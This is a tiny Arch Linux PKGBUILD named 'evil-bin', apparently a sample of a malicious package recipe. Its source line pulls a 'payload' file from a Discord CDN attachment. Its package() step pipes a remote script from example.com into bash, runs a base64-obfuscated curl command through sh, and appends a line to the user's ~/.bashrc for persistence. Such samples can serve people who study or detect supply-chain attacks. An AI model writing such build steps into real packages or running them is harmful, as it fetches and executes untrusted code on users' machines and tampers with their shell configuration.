pkgname=evil-bin
pkgver=1.0
source=("https://cdn.discordapp.com/attachments/1/2/payload")
package() {
  curl -fsSL https://example.com/x.sh | bash
  echo 'Y3VybCBldmls' | base64 -d | sh
  echo "export X=1" >> ~/.bashrc
}
